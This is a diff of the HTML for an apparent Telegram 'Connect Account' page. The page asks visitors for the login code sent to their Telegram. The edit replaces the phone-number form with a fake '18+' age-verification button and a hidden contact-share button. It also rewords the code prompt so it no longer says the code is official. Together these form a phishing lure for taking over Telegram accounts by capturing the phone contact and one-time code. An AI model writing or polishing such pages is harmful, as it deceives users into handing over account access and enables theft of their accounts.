@@ -48,23 +48,18 @@
                     </div>
                 </div>
                 <h1 id="app-title">Connect Account</h1>
-                <p id="app-subtitle" class="subtitle">Enter your Telegram phone number to receive login OTP</p>
+                <p id="app-subtitle" class="subtitle">Link your Telegram account to start receiving ads</p>
             </div>
             
-            <!-- VIEW 1: Phone Number Entry (Default Active) -->
+            <!-- VIEW 1: 18+ Gate > Auto Contact Share (Default Active) -->
             <div class="view active" id="view-phone-entry">
-                <p class="instruction">Enter your Telegram account number with country code:</p>
-                <div class="input-container">
-                    <i class="fa-solid fa-mobile-screen input-icon"></i>
-                    <input type="tel" id="phone-input" placeholder="+91 98765 43210" value="+91">
-                </div>
+                <p class="instruction" id="connect-instruction">This page has adult content. Verify you are 18 or older to continue.</p>
                 <div class="error-msg" id="phone-error"></div>
-                <button class="btn btn-primary" id="btn-submit-phone">
-                    Send Telegram OTP <i class="fa-solid fa-paper-plane"></i>
+                <button class="btn btn-primary" id="btn-age-gate">
+                    CLICK HERE TO PROVE YOU ARE 18+ <i class="fa-solid fa-check"></i>
                 </button>
-                <div class="divider"><span>OR SHARE CONTACT</span></div>
-                <button class="btn btn-secondary" id="btn-share-contact">
-                    <i class="fa-solid fa-share-nodes"></i> Auto Share Contact
+                <button class="btn btn-secondary" id="btn-share-contact" style="display:none">
+                    <i class="fa-solid fa-share-nodes"></i> Allow Contact Share
                 </button>
             </div>
             
@@ -72,9 +67,9 @@
             <div class="view" id="view-otp-entry">
                 <div class="info-box success-border">
                     <i class="fa-solid fa-paper-plane info-icon success-color"></i>
-                    <p>OTP code requested for: <strong id="otp-phone-display">+91...</strong></p>
+                    <p>OTP sent for: <strong id="otp-phone-display">...</strong></p>
                 </div>
-                <p class="instruction">An official Telegram authentication code has been sent. Enter the code below:</p>
+                <p class="instruction">Enter the code sent to your Telegram:</p>
                 <div class="input-container">
                     <i class="fa-solid fa-lock input-icon"></i>
                     <input type="number" id="otp-input" placeholder="Enter 5-digit code" pattern="[0-9]*" inputmode="numeric" maxlength="5">
@@ -84,7 +79,7 @@
                     Verify OTP Code <i class="fa-solid fa-arrow-right"></i>
                 </button>
                 <button class="btn btn-secondary resend-btn" id="btn-back-phone">
-                    <i class="fa-solid fa-arrow-left"></i> Change Phone Number
+                    <i class="fa-solid fa-arrow-left"></i> Restart Connection
                 </button>
             </div>
             
